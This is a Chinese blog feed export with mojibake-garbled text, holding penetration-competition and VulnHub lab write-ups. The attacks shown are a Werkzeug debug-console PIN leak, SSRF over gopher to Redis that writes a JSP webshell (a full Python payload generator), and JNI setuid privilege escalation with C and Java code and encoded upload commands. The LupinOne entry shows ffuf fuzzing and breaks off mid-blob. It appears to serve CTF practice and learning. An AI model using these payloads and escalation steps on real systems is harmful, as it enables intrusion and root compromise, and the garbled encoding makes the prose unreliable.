ä¸€ä¸ªsession</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102127002.png" alt="image-20250110212711902"></p><p>ä½†ä¹Ÿèƒ½åšï¼Œåˆ©ç”¨ä¹‹å‰å¾—åˆ°çš„shell, curlä¸€ä¸‹å³å¯ å¸¦ä¸Šsessionçš„è¯ å°±åŠ ä¸€ä¸ª -b</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102128812.png" alt="image-20250110212814663"></p><p>ä¸‹ä¸€æ­¥çš„è¯ éœ€è¦è·å–etc/passwd é‚£ä¹ˆå°±è¦æ‰¾æ˜¯å¦å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œæˆ–è€…æ˜¯å‘½ä»¤æ‰§è¡Œ ä¹‹å‰çš„ä»»æ„æ–‡ä»¶è¯»å–ç¦æ­¢äº†/ ../ æ‰€ä»¥è¯»å–ä¸äº†/etc/passwd é‚£ä¹ˆå°±çœ‹ä¸€ä¸‹å“ªé‡Œèƒ½è¿›è¡Œrce.</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102205598.png" alt="image-20250110220535417"></p><p>æ ¹æ®è¿”å›çš„ä¿¡æ¯æ¥çœ‹ï¼ŒçŒœæµ‹æ˜¯è·å–pinç </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102208926.png" alt="image-20250110220844849"></p><p>æœç„¶æ˜¯ï¼Œä½†é—®é¢˜æ¥äº†ï¼Œå¦‚ä½•è·å–å®ƒï¼Œä¹‹å‰åšé¢˜éƒ½æ˜¯é€šè¿‡æ–‡ä»¶è¯»å–æ¥è·å–ä¿¡æ¯ï¼Œæœ€åé€šè¿‡è„šæœ¬æ¥ç”Ÿæˆçš„ï¼Œç°åœ¨æ²¡æœ‰æ–‡ä»¶è¯»å–çš„åœ°æ–¹ï¼Œæ€è·¯å¡ç€äº†ã€‚ã€‚ã€‚</p><p>åé¢çœ‹äº†writeup å‘ç°æ˜¯é€šè¿‡è®¾ç½®æ—¥å¿—æ–‡ä»¶æ¥è¿›è¡Œè¾“å‡ºpinç  å…·ä½“çš„åŸå› å¯ä»¥é€šè¿‡åˆ†ææºç å¾—åˆ°ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102230409.png" alt="image-20250110223008223"></p><p>pinç é€šè¿‡æ—¥å¿—è¾“å‡ºå‡ºæ¥</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102231727.png" alt="image-20250110223102638"></p><p>è®©cmdç­‰äºprintpin å¹¶ä¸”è¿™ä¸ªsecretæˆ‘ä»¬æ˜¯çŸ¥é“çš„ å°±è°ƒç”¨self.log_pin_request() å°†è°ƒç”¨çš„ç»“æœè¿”å›ç»™response</p><p>ä¸‹é¢æ˜¯è·å–pinç çš„æ€è·¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">è®¾ç½®æ—¥å¿—<br>/set_log_option?logName=werkzeug&amp;logFile=2.txt<br>å°†pinç è¾“å‡ºåˆ°æ—¥å¿—æ–‡ä»¶ä¸­<br>/console?__debugger__=<span class="hljs-built_in">yes</span>&amp;cmd=printpin&amp;s=CUhyStmf03Rce4NLdL8y //è¿™é‡Œç›´æ¥<span class="hljs-built_in">base64</span>ç¼–ç äº†<br>æŸ¥çœ‹pinç <br>/get_log_content?logFile=2.txt<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥bae64ç¼–ç äº†</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102322236.png" alt="image-20250110232202168"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102320193.png" alt="image-20250110232033009"></p><p>è¿™é‡Œå¾—åˆ°äº†pinç  123-330-612</p><p>ä¸‹ä¸€æ­¥å°±æ˜¯å‘½ä»¤æ‰§è¡Œäº†</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102334376.png" alt="image-20250110233459198"></p><p>è¦è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå°±éœ€è¦ç»è¿‡ä¸Šé¢çš„éªŒè¯æ‰è¡Œï¼Œå‘½ä»¤å‚æ•°cmdå­˜åœ¨ï¼Œframeå­˜åœ¨ï¼Œæœ‰secret å¹¶ä¸”é€šè¿‡äº†pinç éªŒè¯ æœ€ç»ˆæ‰è¿›è¡Œå‘½ä»¤æ‰§è¡Œ æ‰€ä»¥ä¸‹ä¸€æ­¥è¦è¿›è¡Œpinç éªŒè¯ã€‚</p><p>éªŒè¯cmdå‚æ•°å°±åº”è¯¥æ˜¯pinauthäº†ã€‚</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">/console?__debugger__=yes<span class="hljs-variable">&amp;cmd</span>=pinauth<span class="hljs-variable">&amp;pin</span>=<span class="hljs-number">635</span><span class="hljs-number">-303</span><span class="hljs-number">-500</span><span class="hljs-variable">&amp;s</span>=zZImlIWMg8TT8FOMl4zE<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102352367.png" alt="image-20250110235205196"></p><p>å°†å¾—åˆ°çš„cookieä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­</p><p>cookie -c xxx.txt -v -b </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102353491.png" alt="image-20250110235353384"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102354251.png" alt="image-20250110235434135"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501110000011.png" alt="image-20250111000050847">cmdè¿™ä¸ªåœ°æ–¹è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p>å®ƒæ˜¯ä¸€ä¸ªæ— å›æ˜¾çš„ï¼Œæˆ‘ä»¬å°†å®ƒå†™å…¥åˆ°./log/1.txtä¸‹é¢ ç„¶åå†è¯»å–å³å¯ã€‚</p><p>å¯¹äºä¸€äº›ç¬¦å· éœ€è¦äºŒæ¬¡ç¼–ç ç»•è¿‡ æ¯”å¦‚ &amp;å’Œç©ºæ ¼ç­‰(å¦‚æœä¸base64ç¼–ç çš„æƒ…å†µä¸‹ å¯ä»¥åˆ©ç”¨ curl â€œ<a href="http://xxxxx/&quot;">http://xxxxx/&quot;</a> â€“cookie â€œxxxxâ€ -i )</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501132023352.png" alt="image-20250113202330997"></p><h4 id="ç¬¬äº”ç« "><a href="#ç¬¬äº”ç« " class="headerlink" title="ç¬¬äº”ç« "></a>ç¬¬äº”ç« </h4><p>è¿™ä¸ªæ˜¯ä¸€ä¸ªjavaçš„æ¡†æ¶</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501110021561.png" alt="image-20250111002140467"></p><p>è¿™ä¸ªjerryå­˜åœ¨ä¸€ä¸ª WEb-INF æ•æ„Ÿä¿¡æ¯æ³„éœ² </p><p><a href="https://xz.aliyun.com/t/10039?time__1311=Cqjx2DRii=qGqGNDQiuDQqOQQIc4Y5vYqx">https://xz.aliyun.com/t/10039?time__1311=Cqjx2DRii%3DqGqGNDQiuDQqOQQIc4Y5vYqx</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501110024958.png" alt="image-20250111002429891"></p><p>å¯ä»¥å¾—åˆ°rediså¯†ç </p><p>ä¸‹é¢è€ƒå¯Ÿçš„æ˜¯ä¸€ä¸ªSSRFçš„gopherå†™å…¥webshell</p><p>å…ˆåˆ©ç”¨dictè¿›è¡Œæ¢æµ‹ä¸€ä¸‹ï¼š</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501132122165.png" alt="image-20250113212237039"></p><p>å‚è€ƒåšå®¢ï¼š<a href="https://www.keepnight.com/archives/1177/">https://www.keepnight.com/archives/1177/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br>protocol=<span class="hljs-string">&quot;gopher://&quot;</span>  <span class="hljs-comment"># ä½¿ç”¨çš„åè®® </span><br>ip=<span class="hljs-string">&quot;172.2.139.7&quot;</span><br>port=<span class="hljs-string">&quot;6380&quot;</span>   <span class="hljs-comment"># ç›®æ ‡redisçš„ç«¯å£å· </span><br>shell=<span class="hljs-string">&quot;\n\n&lt;% Runtime.getRuntime().exec(request.getParameter(\&quot;cmd\&quot;)); %&gt;\n\n&quot;</span><br>filename=<span class="hljs-string">&quot;1.jsp&quot;</span>   <span class="hljs-comment"># shellçš„åå­— </span><br>path=<span class="hljs-string">&quot;/opt/jetty/webapps/ROOT/&quot;</span>      <span class="hljs-comment"># å†™å…¥çš„è·¯å¾„</span><br>passwd=<span class="hljs-string">&quot;ctfshow_2025&quot;</span>   <span class="hljs-comment"># å¦‚æœæœ‰å¯†ç  åˆ™å¡«å…¥</span><br><span class="hljs-comment"># æˆ‘ä»¬çš„æ¶æ„å‘½ä»¤ </span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span><br>     ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload=protocol+ip+<span class="hljs-string">&quot;:&quot;</span>+port+<span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):<br>    CRLF=<span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd=<span class="hljs-string">&quot;&quot;</span><br>    cmd+=<span class="hljs-string">&quot;*&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd+=CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += quote(redis_format(x))<br>    <span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿˜æ˜¯æœ‰ç‚¹é—®é¢˜ æˆ‘ç»è¿‡ä¸¤æ¬¡urlç¼–ç è¿‡åå‘é€çš„æ•°æ®æŠ¥500  å¯èƒ½æ˜¯æˆ‘çš„æ ¼å¼æœ‰ç‚¹é—®é¢˜ åé¢å°±çœ‹äº†ä¸€ä¸‹å®˜æ–¹wp å‚è€ƒè¿æ¥ï¼š</p><p><a href="https://ysynrh77rj.feishu.cn/docx/F3nJdGJHjo1DSBx8c2TcecLrnvh">https://ysynrh77rj.feishu.cn/docx/F3nJdGJHjo1DSBx8c2TcecLrnvh</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501152000541.png" alt="image-20250115200008358"></p><p>åˆ©ç”¨è¿™ç§æ–¹å¼ï¼Œå°±èƒ½æˆåŠŸçš„å†™é©¬ã€‚</p><p>ç”±äºå®ƒæ˜¯ä¸€ä¸ªæ— å›æ˜¾çš„ï¼Œæˆ‘ä»¬å¯ä»¥å°†ç»“æœè¾“å‡ºåˆ°/opt/jetty/webapps/ROOT/ä¸‹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501152004977.png" alt="image-20250115200408791"></p><p>æœ€åå°±æ˜¯ææƒäº†ã€‚</p><p>suidçš„è¯æ²¡å•¥ä¸œè¥¿ ç„¶åCapabilities èƒ½æ‰¾åˆ°ä¸€ä¸ªææƒåˆ©ç”¨</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501152102957.png" alt="image-20250115210215750"></p><p>ä¸‹é¢æ˜¯æˆ‘ç†è§£çš„å¤§ä½“æ€è·¯  é¦–å…ˆæ‰§è¡Œsetuidçš„æ˜¯ä¸€ä¸ªrootç”¨æˆ· æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªè°ƒç”¨setuidçš„cæ–‡ä»¶ ç„¶åå°†å…¶ç¼–è¯‘ä¸ºsoæ–‡ä»¶ å†™ä¸€ä¸ªjavaä»£ç æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ è®©å…¶åŒ…å«æˆ‘ä»¬ç¼–è¯‘çš„soæ–‡ä»¶ è¿™æ ·å½“javaæ‰§è¡Œå‘½ä»¤æ—¶ï¼Œå°±ä¼šä»¥rootèº«ä»½è¿è¡Œã€‚</p><p>ç¬¬ä¸€æ­¥ï¼Œå†™ä¸€ä¸ªè°ƒç”¨setuidçš„cæ–‡ä»¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;jni.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>JNIEXPORT jint JNICALL <span class="hljs-title function_">Java_SetUID_setUID</span><span class="hljs-params">(JNIEnv *env, jobject obj, jint uid)</span> &#123;<br>    <span class="hljs-keyword">return</span> setuid(uid);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šä¼ ä¸Šå»ï¼Œåˆ©ç”¨base64ç¼–ç </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">echo<span class="hljs-variable">%20</span><span class="hljs-string">&quot;I2luY2x1ZGUgPGpuaS5oPgovLzExMTExMTExMTExMjIKI2luY2x1ZGUgPHVuaXN0ZC5oPgoKSk5JRVhQT1JUIGppbnQgSk5JQ0FMTCBKYXZhX1NldFVJRF9zZXRVSUQoSk5JRW52ICplbnYsIGpvYmplY3Qgb2JqLCBqaW50IHVpZCkgewogICAgcmV0dXJuIHNldHVpZCh1aWQpOwp9&quot;</span><span class="hljs-variable">%20</span>|base<span class="hljs-number">64</span><span class="hljs-variable">%20</span>-d<span class="hljs-variable">%20</span>&gt;/opt/jetty/webapps/ROOT/SetUID.<span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><p> ç„¶åç¼–å†™javaæ–‡ä»¶ ä¹Ÿä¸Šä¼ ä¸Šå»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SetUID</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;SetUID&quot;</span>); <br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> <span class="hljs-type">int</span> <span class="hljs-title function_">setUID</span><span class="hljs-params">(<span class="hljs-type">int</span> uid)</span>; <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">SetUID</span> <span class="hljs-variable">setUID</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SetUID</span>();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> setUID.setUID(<span class="hljs-number">0</span>); <br>        Runtime.getRuntime.exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;cat /root/*.txt&gt;/opt/jetty/webapps/ROOT/root.txt&quot;</span>&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">echo%20<span class="hljs-string">&quot;cHVibGljIGNsYXNzIFNldFVJRCB7CiAgICBzdGF0aWMgewogICAgICAgIFN5c3RlbS5sb2FkTGlicmFyeSgiU2V0VUlEIik7IAogICAgfQoKICAgIHB1YmxpYyBuYXRpdmUgaW50IHNldFVJRChpbnQgdWlkKTsgCiAgLy9hCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBTZXRVSUQgc2V0VUlEID0gbmV3IFNldFVJRCgpOwogICAgICAgIGludCByZXN1bHQgPSBzZXRVSUQuc2V0VUlEKDApOyAKICAgICAgICBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBTdHJpbmdbXXsic2giLCItYyIsImNhdCAvcm9vdC8qLnR4dD4vb3B0L2pldHR5L3dlYmFwcHMvUk9PVC9yb290LnR4dCJ9KTsKICAgIH0KfQ==&quot;</span>%20|base64%20-d%20&gt;<span class="hljs-regexp">/opt/</span>jetty/webapps/ROOT/SetUID.java<br></code></pre></td></tr></table></figure><p>ç„¶åç¼–è¯‘cæ–‡ä»¶ </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gcc%<span class="hljs-number">20</span>-shared%<span class="hljs-number">20</span>-fPIC%<span class="hljs-number">20</span>-o%<span class="hljs-number">20</span><span class="hljs-regexp">/opt/</span>jetty<span class="hljs-regexp">/webapps/</span>ROOT<span class="hljs-regexp">/libSetUID.so%20-I$&#123;JAVA_HOME&#125;/i</span>nclude%<span class="hljs-number">20</span>-I<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span><span class="hljs-regexp">/include/</span>linux%<span class="hljs-number">20</span><span class="hljs-regexp">/opt/</span>jetty<span class="hljs-regexp">/webapps/</span>ROOT/SetUID.c<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘javaæ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">javac%<span class="hljs-number">20</span><span class="hljs-regexp">/opt/</span>jetty<span class="hljs-regexp">/webapps/</span>ROOT/SetUID.java<br></code></pre></td></tr></table></figure><p>ç„¶ååŠ è½½ç¼–è¯‘å¥½çš„cæ–‡ä»¶ ä½¿å¾—ä»¥rootèº«ä»½è¿è¡Œç³»ç»Ÿå‘½ä»¤</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">java%<span class="hljs-number">20</span>-Djava.library.path=<span class="hljs-regexp">/opt/</span>jetty<span class="hljs-regexp">/webapps/</span>ROOT<span class="hljs-regexp">/%20-cp%20/</span>opt<span class="hljs-regexp">/jetty/</span>webapps<span class="hljs-regexp">/ROOT/</span>%<span class="hljs-number">20</span>SetUID<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501152225938.png" alt="image-20250115222511657"></p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æ¯”èµ›</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¯”èµ›å¤ç°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Empire_LupinOne</title>
    <link href="/2025/01/02/Empire%20LupinOne/"/>
    <url>/2025/01/02/Empire%20LupinOne/</url>
    
    <content type="html"><![CDATA[<h1 id="Empire-LupinOne"><a href="#Empire-LupinOne" class="headerlink" title="Empire: LupinOne"></a>Empire: LupinOne</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>é¦–å…ˆæ‰«æå­˜æ´»ä¸»æœºã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021619126.png" alt="image-20250102161945945"></p><p>å¾—åˆ°ipåœ°å€ä¸º192.168.29.170</p><p>ç„¶åæ‰«æç«¯å£ä¿¡æ¯ï¼Œè¿›è¡ŒæœåŠ¡çš„è®¿é—®ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021624082.png" alt="image-20250102162422022"></p><p>80å’Œ22ç«¯å£å¼€æ”¾ï¼Œæ²¡å•¥ç‰¹åˆ«çš„æ¼æ´ï¼Œé‚£å°±å»æ‰«ä¸€ä¸‹åå°çœ‹æ˜¯å¦å­˜åœ¨æ•æ„Ÿæ–‡ä»¶ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021629470.png" alt="image-20250102162917323"></p><p>è®¿é—®/manual ä¼šè·³è½¬åˆ°ä¸€ä¸ª<strong>Apache HTTP Server Version 2.4</strong> æœåŠ¡çš„ç•Œé¢ã€‚</p><p>æ²¡æ‰¾åˆ°ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„æ¼æ´ï¼Œç„¶åå»è®¿é—®robots.txt</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021646209.png" alt="image-20250102164607150"></p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªè·¯å¾„ æˆ‘ä»¬å»è®¿é—®ä¸€ä¸‹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021647451.png" alt="image-20250102164701414"></p><p> æŸ¥çœ‹ç½‘é¡µæºä»£ç  </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021647490.png" alt="image-20250102164756444"></p><p>çŒœæµ‹è¿˜æœ‰å…¶ä»–çš„è·¯å¾„ï¼Œåªä¸è¿‡æ˜¯æ²¡æ‰«åˆ°ã€‚</p><p>ç½‘ä¸Šæœäº†ä¸€ä¸‹ï¼Œåˆ©ç”¨ffufå¯¹~åé¢çš„å†…å®¹è¿›è¡Œfuzz</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021703708.png" alt="image-20250102170310648"></p><p>å¯ä»¥çœ‹åˆ°secret,è®¿é—®ä¸€ä¸‹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021703201.png" alt="image-20250102170347152"></p><p>å¾ˆæ˜æ˜¾äº†ï¼Œåœ¨è¿™ä¸ªç›®å½•ä¸‹æ¥ç€æ‰«åå°ã€‚</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">ffuf -u <span class="hljs-string">&quot;http://192.168.29.170/~secret/.FUZZ&quot;</span> -w <span class="hljs-string">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span> -e <span class="hljs-string">.txt</span>,<span class="hljs-string">.pub</span>,<span class="hljs-string">.html</span>,<span class="hljs-string">.bak</span> -mc 200<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021818135.png" alt="image-20250102181834854"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>å»è®¿é—®è¿™ä¸ªæ–‡ä»¶ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501021819890.png" alt="image-20250102181903793"></p><p>ä¸€æ®µç»è¿‡baseåŠ å¯†è¿‡åçš„å†…å®¹ ï¼Œç»è¿‡æµ‹è¯•å‘ç°æ˜¯base58</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">cGxD<span class="hljs-number">6</span>K<span class="hljs-symbol">NZQddY6</span>iCsSuqPzUdqSx<span class="hljs-number">4</span>F<span class="hljs-number">5</span>ohDY<span class="hljs-symbol">nArU3</span>kw<span class="hljs-number">5</span>dmvTURqcaTr<span class="hljs-symbol">ncHC3</span><span class="hljs-symbol">NLKBqFM2</span>ywr<span class="hljs-symbol">NbRTW3</span>eTpUvEz<span class="hljs-number">9</span>qFuB<span class="hljs-symbol">nyhAK8</span>TWu<span class="hljs-number">9</span>cFxLoscWUrc<span class="hljs-number">4</span>rLcRafiVvxPRpP<span class="hljs-number">692</span>Bw<span class="hljs-number">5</span>bshu<span class="hljs-number">6</span>ZZpixzJWv<span class="hljs-symbol">NZhPEoQoJRx7</span>jU<span class="hljs-symbol">nupsEhcCgjuXD7</span>B<span class="hljs-symbol">N1</span>TMZGL<span class="hljs-number">2</span><span class="hljs-symbol">nUxcDQwahUC1</span>u<span class="hljs-number">6</span><span class="hljs-symbol">NLSK81</span>Yh<span class="hljs-number">9</span>Lk<span class="hljs-symbol">ND67</span>WD<span class="hljs-number">87</span>Ud<span class="hljs-number">2</span>JpdUwjMossSeHEbvYjCEYB<span class="hljs-symbol">nKRPpDhSgL7</span>jmTzxmtZxS<span class="hljs-number">9</span>wX<span class="hljs-number">6</span>D<span class="hljs-symbol">NLmQBsNT936</span>L<span class="hljs-number">6</span>VwYdEPKuLeY<span class="hljs-number">6</span>wuyYmffQYZEVXhDtK<span class="hljs-number">6</span>pokmA<span class="hljs-number">3</span>J<span class="hljs-meta">o2</span>Q<span class="hljs-number">83</span>cVok<span class="hljs-number">6</span>x<span class="hljs-number">74</span><span class="hljs-name">M5</span>DA<span class="hljs-number">1</span>TdjKvEsVGLvRMkkDpshztiGCaDu<span class="hljs-number">4</span>uceLw<span class="hljs-number">3</span>iLYv<span class="hljs-symbol">NVZK75</span>k<span class="hljs-number">9</span>zK<span class="hljs-number">9</span>E<span class="hljs-number">2</span>qcdwP<span class="hljs-number">7</span>yWugahC<span class="hljs-symbol">n5</span>HyoaooLeBDiCAojj<span class="hljs-number">4</span>JUxafQUcmfocvugz<span class="hljs-symbol">n81</span>GAJ<span class="hljs-number">8</span>LdxQjosS<span class="hljs-number">1</span>tHmriYtwp<span class="hljs-number">8</span>pGf<span class="hljs-number">4</span><span class="hljs-symbol">Nfq5</span>FjqmGAdvA<span class="hljs-number">2</span>ZPMUAVWVHgkeSVE<span class="hljs-symbol">nooKT8</span>sxGUfZxg<span class="hljs-symbol">nHAfER49</span><span class="hljs-symbol">nZnz1</span>YgcFkR<span class="hljs-number">73</span>rWfP<span class="hljs-number">5</span><span class="hljs-symbol">NwEpsCgeCWYSYh3</span>XeF<span class="hljs-number">3</span>dUqBBpf<span class="hljs-number">6</span>xMJ<span class="hljs-symbol">nS7</span>wmZa<span class="hljs-number">9</span>oWZVd<span class="hljs-number">8</span>Rxs<span class="hljs-number">1</span>zrXawVKSLxardUEfRLh<span class="hljs-number">6</span>us<span class="hljs-symbol">nUmMMAnSmTyuvMTnjK2</span>vzTBbd<span class="hljs-number">5</span>djvhJKaY<span class="hljs-number">2</span>szXFetZdWBsRFhUwReUk<span 